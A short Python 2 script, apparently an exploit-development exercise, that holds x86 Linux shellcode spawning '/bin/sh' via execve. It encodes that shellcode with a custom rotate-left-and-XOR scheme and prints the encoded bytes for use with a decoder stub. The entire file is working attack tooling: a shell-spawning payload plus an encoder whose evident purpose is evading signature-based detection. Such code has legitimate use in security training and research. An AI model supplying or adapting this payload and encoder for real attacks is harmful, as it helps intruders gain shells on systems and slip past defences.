#!/usr/bin/python


def rol(byte, op):
	new_byte = 0
	new_byte = byte << op
	return (new_byte & 0xff) + (new_byte >> 8)



shellcode = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

# Initialized with 0xaa
previous_byte = 0xaa

for x in bytearray(shellcode) :

	y = rol(x, 3)		# rotate left with 3
	z = y^previous_byte	# xor with the previous byte

	previous_byte = x

	encoded += '\\x'
	encoded += '%02x' % z

	encoded2 += '0x'
	encoded2 += '%02x,' % z


print encoded

print encoded2

print 'Len: %d' % len(bytearray(shellcode))
